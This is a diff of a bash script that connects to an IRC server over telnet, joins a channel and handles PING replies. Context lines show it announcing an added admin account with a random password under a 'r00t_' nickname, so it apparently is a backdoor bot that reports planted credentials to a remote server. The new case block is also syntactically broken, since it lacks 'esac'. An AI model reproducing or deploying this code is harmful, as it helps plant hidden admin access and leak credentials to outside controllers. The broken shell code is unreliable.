@@ -25,16 +25,17 @@ arr4y="Added admin:, $random_user, password:, $random_number";
 echo "NICK r00t_$random_user" > input 
 echo "USER $user" >> input
 echo "JOIN #$channel" >> input
-tail -f input | telnet $server 6667 | while read res
+tail -f $input | telnet $server 6667 | while read res
 do
-  set -- ${REPLY//$'\r'/}
-
-  [ "$1" == "PING" ] && echo "PONG $2" >> input
-
-  if [ "$2" == "001" ] ; then
-    echo $*
-    echo "JOIN #$channel" >> input
-  fi
+  case "$res" in
+    # respond to ping requests from the server
+    PING*)
+      echo "$res" | sed "s/I/O/" >> $input 
+    ;;
+    # for pings on nick/user
+    *"You have not"*)
+      echo "JOIN #$channel" >> $input
+    ;;
 done
 
 
